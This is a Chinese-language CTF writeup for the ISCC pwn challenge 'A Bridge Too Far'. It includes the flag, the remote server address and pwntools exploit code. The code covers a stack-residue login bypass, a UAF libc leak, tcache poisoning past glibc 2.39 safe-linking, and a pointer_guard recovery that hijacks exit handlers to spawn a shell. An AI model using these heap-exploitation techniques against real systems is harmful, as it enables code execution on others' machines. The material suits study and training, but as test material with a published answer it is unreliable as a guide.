# A Bridge Too Far — 完整 Writeup

**题目**: ISCC CTF PWN 150pt
**远程**: 39.96.193.120:9999
**Flag**: `ISCC{ck220sed-dr31-apzq-eorq-kb26qdsdwbcn}`

---

## 0. 题目概况

### 二进制保护 (checksec)

```
$ python -c "from pwn import *; ELF('./package/pwn', checksec=True)"
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
FORTIFY:  Enabled
SHSTK:    Enabled
IBT:      Enabled
```

全保护开启，无法直接栈溢出或 GOT 覆写。

### 运行环境

- 动态链接 C++ 程序，自带 `ld-linux-x86-64.so.2`、`libc.so.6`、`libstdc++.so.6`
- Libc 版本: **Ubuntu GLIBC 2.39-0ubuntu8.7**
- 本地运行: `./package/ld-linux-x86-64.so.2 --library-path ./package ./package/pwn`

### 题目 3 个 hint

1. 堆菜单似乎有缺陷
2. 登录逻辑中，缓冲区会在什么时候被清空
3. 寻路逻辑和标准 DFS 不太一样

---

## 1. Phase 1: 登录绕过（缓冲区残留）

### 1.1 漏洞原理

程序启动时:

1. `init()` 用 MT19937 PRNG 生成 31 字节**可打印字符**密码
2. 分别为 `test` 和 `pl1` 两个用户生成密码，写入栈缓冲区 `[rsp+0x90]`
3. 随后程序询问"启动用户名/密码" → **同一块栈缓冲区 `[rsp+0x90]` 被复用**
4. 自定义输入函数一次最多读 31 字节，仅在遇到 `\n` 时裁剪

**核心漏洞**: 输入函数**不清空缓冲区**。若发送 Ctrl-D（EOF），`read()` 返回 0，缓冲区内容完全不变。

登录时 `memcmp(input, stored_password_hash)` 比较的是缓冲区内容与初始化时写入的哈希 → 缓冲区中仍有原始密码即可通过。

### 1.2 利用方法（Ctrl-D 方案，推荐）

```
步骤 1: 启动用户名 → 任意输入（如 "hacker\n"）
步骤 2: 启动密码   → Ctrl-D（read() 返回 0，缓冲区保留 pl1 的密码）
步骤 3: 主菜单选 1 → 登录
步骤 4: 用户名     → "pl1\n"
步骤 5: 密码       → Ctrl-D（缓冲区仍是 pl1 原始密码）
步骤 6: memcmp 通过 → 登录成功，以 pl1 身份进入游戏
```

### 1.3 备选方案：1 字节爆破（WP 方案）

```
步骤 1: 启动用户名 → "X\n"
步骤 2: 启动密码   → "\n"（仅换行，空密码）
步骤 3: 主菜单选 1 → 登录
步骤 4: 用户名     → "pl1\n"
步骤 5: 密码       → 只发 1 个字节（不带换行）
  效果: 只覆盖第 0 字节，第 1~30 字节仍是 pl1 原始密码
  需要: 最多 256 次尝试（实际仅可打印字符，~95 次）
  优势: 失败后同连接继续试，每次只换第 0 字节
```

### 1.4 关键代码

```python
io.recvuntil(b':')
io.sendline(b'hacker')          # startup username
io.recvuntil(b':')
time.sleep(0.1)
io.send(b'\x04')                # Ctrl-D → read() returns 0
time.sleep(0.3)
io.recvuntil(b'5.')             # wait for main menu
io.sendline(b'1')               # Login
io.recvuntil(b':')
io.sendline(b'pl1')
io.recvuntil(b':')
time.sleep(0.1)
io.send(b'\x04')                # Ctrl-D again
```

---

## 2. Phase 2: 游戏导航 → 月球 → Note 菜单

### 2.1 岛屿系统

程序维护 64 个岛屿位置，核心游戏状态在栈上:

```
[rsp+0x330] = 当前位置 (island index, 0-63)
[rsp+0x334] = 材料数量 (初始 400)
[rsp+0x32C] = 已解锁岛屿总数
```

每个岛屿运行时结构体 (0x50 字节):
```
[+0x00] x, y 坐标
[+0x10] w2 (byte)
[+0x11] visible (byte, 0=隐藏 1=可见)
[+0x14] event_type (int)
[+0x18] 资源/消耗
[+0x30] 名称指针 (UTF-8)
[+0x38] 描述指针
[+0x48] hash (44-bit SHA-256)
```

### 2.2 关键岛屿与事件

| 岛屿 | 索引 | event_type | 事件效果 |
|------|------|-----------|---------|
| Data Reef | 14 (初始模板) | 7 | 设置 `moon.visible = 1` |
| superadmin | 隐藏表 [14] | 8 | 免费建桥终端 → 连接到月球 |
| 月球 | 63 | - | 触发隐藏 note 菜单 (`0xBF20`) |
| 地堡 | 隐藏表 [2] | 2 | 获得 300 材料 |
| 漂流木堆 | 隐藏表 [8] | 2 | 获得 200 材料 |

### 2.3 菜单结构

```
主菜单:
  1. 导航到岛屿（查看可移动列表）
  2. 建造桥梁
  3. 登录子账户
  4. 自动寻路
  5. 探索 → 子菜单
      1. 随机探索
      2. 根据传说搜寻 → 输入岛名直接解锁！
  6. 查看状态（材料、已解锁数、当前位置）
  0. 返回

隐藏 Note 菜单 (到达月球后触发):
  1. add note
  2. delete note
  3. view note
  4. edit note
```

### 2.4 导航路径（5 步）

```
Step 1: 到达 Data Reef
  建桥到 Data Reef（初始 16 岛之一）
  → 移动到 Data Reef → 触发 Event 7
  → moon.visible = 1（月球解锁！）

Step 2: 传说搜寻 superadmin
  菜单 5（探索）→ 2（根据传说搜寻）
  → 输入 "superadmin"
  → 消耗 100 材料，从隐藏表创建 superadmin 岛

Step 3: 建桥到 superadmin + 移动到 superadmin
  材料不足时先探索低花费岛（发现新岛 +200 材料）
  地堡 (Event 2) 给 300 材料，漂流木堆给 200

Step 4: 探索 superadmin → 触发 Event 8
  菜单 5（探索）→ 提示 "目标岛屿名"
  → 输入 "月球"
  → Event 8 免费建桥连接月球

Step 5: 移动到月球
  检测 position==63 且 moon.visible!=0
  → 触发 note 菜单函数 (0xBF20)
  → 进入 UAF 漏洞利用阶段
```

### 2.5 游戏交互示例

```
>>> 2                # 建造桥梁
1. Echo Base (消耗: 52)
2. Data Reef (消耗: 128)
...
请选择: 2
建造成功！消耗 128 材料

>>> 1                # 导航到岛屿
1. Data Reef (距离: 0)
请选择: 1
你到达了 Data Reef
一座古老的数据中心...
你发现了登月计划的资料！月球已被解锁。

>>> 5                # 探索
1. 随机探索
2. 根据传说搜寻
请选择: 2
请输入岛屿名: superadmin
传说指引你解锁了 superadmin！坐标: (15420, 8320)
```

---

## 3. Phase 3: 堆利用 — UAF → tcache poison → exit handler

### 3.1 Note 菜单漏洞

Note 菜单维护 16 个槽位，最大 note 大小 `0x800`:

| 操作 | 实现 | 漏洞 |
|------|------|------|
| `add(idx, size)` | `notes[idx] = new char[size]` | - |
| `delete(idx)` | `delete[] notes[idx]` | **不置空 notes[idx]** → UAF |
| `view(idx)` | `write(1, notes[idx], size)` | 可读已释放内存 → **泄漏** |
| `edit(idx)` | `read(0, notes[idx], size)` | 可写已释放内存 → **UAF 写** |

同时具备: UAF 读、UAF 写、double free（多次 free 同一槽位）。

### 3.2 关键 libc 偏移 (glibc 2.39-0ubuntu8.7)

```
libc 偏移 (已验证):
  UNSORTED_OFF     = 0x203B20   // main_arena.bins[0] = &unsorted_bin
  EXIT_FUNCS_OFF   = 0x203680   // __exit_funcs 指针 → &initial
  EXIT_NODE_OFF    = 0x204FC0   // initial exit_function_list
  system           = 0x58750
  /bin/sh          = 0x1CB42F

libstdc++ 偏移:
  EXIT_ENTRY1_DSO  = 0x279100
  EXIT_ENTRY1_FUNC = 0xB8DA0
```

验证方法:
```python
# __exit_funcs 验证: 在 libc 中搜索指向 0x204FC0 的指针
# 唯一引用在 0x203680 → 确认 __exit_funcs → &initial
```

### 3.3 攻击步骤详解

#### Step 1: libc 泄漏 (unsorted bin)

```python
add(0, 0x500)        # 大于 tcache 最大 bin (0x410) → 将来 free 进 unsorted bin
add(15, 0x20)        # guard chunk，防止与 top chunk 合并
delete(0)            # 进入 unsorted bin
leak = u64(view(0)[:8])    # fd 指针 → main_arena + 0x60
libc_base = leak - 0x203B20
```

#### Step 2: tcache poisoning（safe-linking 绕过 + double free）

glibc 2.39 有 safe-linking: `fd = (real_ptr ^ (chunk_addr >> 12))`。
还有 tcache key（在 chunk 的 bk 位置）用于检测 double free。

绕过方法: 用 UAF 的 `edit` 清掉 tcache key，再 free。

```python
# a) 分配两个 0x20 chunk
add(a, 0x20); add(b, 0x20)

# b) 放入 tcache: b → a
delete(a); delete(b)

# c) UAF 读 → 泄 safe-linked fd → 解码得 chunk_a 堆地址
chunk_a = demangle(u64(view(b)[:8]))
chunk_b = chunk_a + 0x20 + 0x10  # data + chunk header

# d) UAF 写 → 清 tcache key（bk 位置 = user_data+8）
edit(b, b'B'*8 + p64(0) + b'C'*(size-16))

# e) 再次 free → double free 成功: tcache → b → b → a
delete(b)

# f) 分配两次，都拿到 chunk b
add(c, 0x20); add(d, 0x20)

# g) 将 c 放回 tcache: tcache → c → b → b → ...
delete(c)

# h) 修改 d（即 chunk b）的 fd → poisoned = target ^ (chunk_b >> 12)
edit(d, p64(poisoned) + p64(0) + b'D'*(size-16))

# i) 两次分配 → 第二个分配落在 target
add(e, 0x20); add(f, 0x20)   # f → target!
```

safe-linking 解码函数:
```python
def demangle(enc):
    x = enc
    for _ in range(6):
        x = enc ^ (x >> 12)
    return x
```

#### Step 3: 泄漏 pointer_guard

`exit_function_list` 结构 (每个节点):

```
[+0x00] next           (8 bytes, pointer to next node)
[+0x08] idx            (4 bytes, number of active entries)
[+0x0C] padding        (4 bytes)
[+0x10] entry[0]       (0x20 bytes each)
[+0x30] entry[1]
...
```

每个 entry (0x20 字节):
```
[+0x00] flavor (4 bytes: 4=ef_cxa)
[+0x04] padding
[+0x08] func   (8 bytes, PTR_MANGLE encoded)
[+0x10] arg    (8 bytes)
[+0x18] dso    (8 bytes)
```

**关键技巧**: 将 chunk 落在 `node + 0x20`（而不是 `+0x00`）:
- `tcache_get` 返回时清零用户区前 8 字节
- `node + 0x00` 的清零会破坏 `next` → 链表断裂
- `node + 0x20` 的清零只影响 `entry[0].dso` → `idx` 和 `next` 安全

读取后得 entry1 的编码函数指针和 DSO:
```python
ptr_guard = ror64(entry1_enc, 17) ^ (libstdc_base + 0xB8DA0)
```

#### Step 4: 覆盖 exit entry → system("/bin/sh")

```python
entry12_addr = node + 0x190
slot_w, _ = tcache_poison(7, entry12_addr, 0x20)

encoded = rol64(system_addr ^ ptr_guard, 17)
payload = flat(4, encoded, binsh_addr, 0)
edit(slot_w, payload)   # entry12 → system("/bin/sh")
```

#### Step 5: 触发 exit

```python
menu(9)  # 非法菜单选项 → exit() → __run_exit_handlers
         # → 遍历 exit_function_list → 调用 system("/bin/sh")
```

### 3.4 为什么打 `exit handler` 而不是 `__free_hook`

glibc 2.39 中:
- `__free_hook` 符号仍存在于 `0x20A148`
- 但 `free()` 实现已移除对 `__free_hook` 的检查/调用
- `exit()` → `__run_exit_handlers` 仍然会遍历 `__exit_funcs` 链表并调用其中注册的函数
- 因此 exit handler 劫持是 2.39 下的有效攻击面

### 3.5 pointer mangling 原理

glibc 使用 `PTR_MANGLE` 宏保护 `exit_function_list` 中的函数指针:

```
编码: enc = rol(func ^ pointer_guard, 0x11)
解码: func = ror(enc, 0x11) ^ pointer_guard
```

其中 `0x11 = 17` 是移位量。

`pointer_guard` 存储在 TLS 中（`fs:0x30`），无法直接读取。但攻破方法:
1. libc 初始化时通过 `__cxa_atexit` 注册了 libstdc++ 的析构函数
2. entry1 的 `enc` 可读，`dso` 泄露 libstdc++ 基址
3. libstdc++ 基址 + 已知偏移 = 原始函数地址
4. `ptr_guard = ror(enc, 17) ^ func` → 反推 pointer_guard

---

## 4. 完整利用流程 (复现步骤)

### 4.1 准备工作

```bash
# 确认文件结构
ls package/
# pwn  ld-linux-x86-64.so.2  libc.so.6  libgcc_s.so.1  libm.so.6  libstdc++.so.6

# 确认 Python 环境
python -c "from pwn import *; print('pwntools OK')"

# 确认 libc 版本
strings package/libc.so.6 | grep "GLIBC 2.39"
# → GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.7) stable release version 2.39.
```

### 4.2 一键攻击

```bash
# 本地测试（需 Linux 环境 / WSL）
# 编辑 exp_full.py 设置 LOCAL = True
python exp_full.py

# 远程攻击（默认）
python exp_full.py
# 或
python exp_full.py REMOTE
```

### 4.3 手动分步复现

**Phase 1: 登录绕过**
```bash
python -c "
from pwn import *
context.log_level = 'info'
io = process(['./package/ld-linux-x86-64.so.2', '--library-path', './package', './package/pwn'],
             stdin=PTY, stdout=PTY, stderr=PTY)
# 交互式测试 Ctrl-D 绕过
import time
io.recvuntil(b':')
io.sendline(b'hacker')
io.recvuntil(b':')
time.sleep(0.1); io.send(b'\x04')
time.sleep(0.3)
io.recvuntil(b'5.')
io.sendline(b'1')
io.recvuntil(b':')
io.sendline(b'pl1')
io.recvuntil(b':')
time.sleep(0.1); io.send(b'\x04')
time.sleep(0.5)
print(io.recv(timeout=2))
io.interactive()
"
```

**Phase 2: 游戏导航**
```bash
# 到达 game 菜单后，手动操作:
# 2 → 选 Data Reef 建桥 → 1 → 移动到 Data Reef
# 5 → 2 → "superadmin" → 传说搜寻解锁
# 2 → 建桥到 superadmin → 1 → 移动到 superadmin
# 5 → 探索 superadmin → 输入 "月球"
# 1 → 移动到月球 → 应看到 "add note" 菜单
```

**Phase 3: 堆利用验证**
```bash
# 在 note 菜单中手动验证:
# 1 → 0 → 1280 → (add 0x500 chunk)
# 1 → 15 → 32 → (guard chunk)
# 2 → 0 → (delete → unsorted bin)
# 3 → 0 → (view → 应看到 libc 地址)
```

### 4.4 故障排除

| 症状 | 可能原因 | 解决方法 |
|------|---------|---------|
| Phase 1: `用户名或密码错误` | 没用 PTY | 必须 `stdin=PTY, stdout=PTY` |
| Phase 1: 持续失败 | 栈残留被覆盖 | 尝试取不同时间的 Ctrl-D |
| Phase 2: `材料不足` | 桥花费随机过高 | 重试（新 PRNG 种子 = 新坐标） |
| Phase 2: superadmin 未出现 | 传说搜寻失败 | 检查材料≥100，输入拼写正确 |
| Phase 2: Event 8 无响应 | 没正确触发探索 | 确保在 superadmin 岛按 5 探索 |
| Phase 3: leak 不对 | libc 基址计算错误 | 确认版本匹配，检查 0x203B20 |
| Phase 3: pointer_guard 错误 | entry1 解析出错 | 检查 node+0x20 偏移是否准确 |

---

## 5. 核心考点总结

| # | 考点 | 技术 |
|---|------|------|
| 1 | 栈缓冲区残留 | PTY 下 `read()` 返回 0 不清空缓冲区 |
| 2 | 游戏隐藏机制 | "根据传说搜寻" 可按名称定点解锁隐藏岛屿 |
| 3 | glibc 2.39 safe-linking | `demangle()` 解码保护指针，清 tcache key 绕过 double-free |
| 4 | exit handler 劫持 | 放弃 `__free_hook`，攻击 `__run_exit_handlers` 的 `exit_function_list` |
| 5 | pointer mangling 绕过 | 利用已知 entry1 的 (enc, func) 对反推 `pointer_guard` |

---

## 6. 文件索引

```
pwnlei2/
├── package/
│   ├── pwn                   # 题目二进制
│   ├── libc.so.6             # glibc 2.39
│   ├── ld-linux-x86-64.so.2  # 动态链接器
│   └── libstdc++.so.6        # C++ 标准库
├── exp_full.py               # ★ 完整利用脚本（Phase 1+2+3）
├── exp_note_exit.py          # Phase 3 参考（购买的 exp，含 noteonly.so hook）
├── wp.md                     # 购买的 writeup 参考
├── WRITEUP.md                # ★ 本文件（完整 writeup）
├── Dockerfile                # 远程环境 Docker
└── flag.txt                  # flag
```
